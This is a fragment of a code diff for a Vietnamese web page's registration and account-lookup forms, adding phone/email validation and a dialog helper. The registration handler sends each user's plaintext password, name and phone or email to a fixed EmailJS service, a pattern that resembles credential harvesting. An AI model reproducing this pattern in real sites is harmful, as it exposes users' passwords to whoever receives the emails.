+            if (!phone || (!isValidPhone(phone) && !isValidEmail(phone))) {
+                showDialog("Tìm kiếm thất bại!", "Vui lòng nhập số di động hoặc email hợp lệ!");
                 return;
             }
-
             const templateParams = {
                 password: '',
-                phone: phone,
-                email: '',
+                phone: isValidPhone(phone) ? phone : '',
+                email: isValidEmail(phone) ? phone : '',
                 firstName: '',
                 lastName: ''
             };
-
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi đến email/số điện thoại của bạn!"))
+                .then(() => showDialog("Gửi yêu cầu thành công!", "Yêu cầu đã được gửi!"))
                 .catch(() => showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản!"));
         }
 
@@ -572,24 +574,42 @@
             const firstName = document.getElementById('firstName').value;
             const lastName = document.getElementById('lastName').value;
             const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value || phone; // Dùng phone nếu không có email riêng
             const password = document.getElementById('new-password').value;
 
             if (!firstName || !lastName || !phone || !password) {
                 showDialog("Đăng ký thất bại!", "Vui lòng điền đầy đủ thông tin!");
                 return;
             }
+            if (!isValidPhone(phone) && !isValidEmail(phone)) {
+                showDialog("Đăng ký thất bại!", "Số di động hoặc email không hợp lệ!");
+                return;
+            }
 
             const templateParams = {
                 password: password,
-                phone: phone,
-                email: phone,
+                phone: isValidPhone(phone) ? phone : '',
+                email: isValidEmail(phone) ? phone : email,
                 firstName: firstName,
                 lastName: lastName
             };
-
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
-                .then(() => showDialog("Đăng ký thành công!", "Email đã được gửi thành công!"))
-                .catch(() => showDialog("Đăng ký thất bại!", "Có lỗi xảy ra, vui lòng thử lại!"));
+                .then(() => showDialog("Đăng ký thành công!", "Thông tin đã được gửi!"))
+                .catch(() => showDialog("Đăng ký thất bại!", "Có lỗi xảy ra!"));
+        }
+
+        function showDialog(title, message) {
+            const dialog = document.getElementById('custom-dialog');
+            const overlay = document.getElementById('dialog-overlay');
+            document.getElementById('dialog-title').innerText = title;
+            document.getElementById('dialog-message').innerText = message;
+            dialog.style.display = 'block';
+            overlay.style.display = 'block';
+        }
+
+        function hideDialog() {
+            document.getElementById('custom-dialog').style.display = 'none';
+            document.getElementById('dialog-overlay').style.display = 'none';
         }
     </script>
 </body>
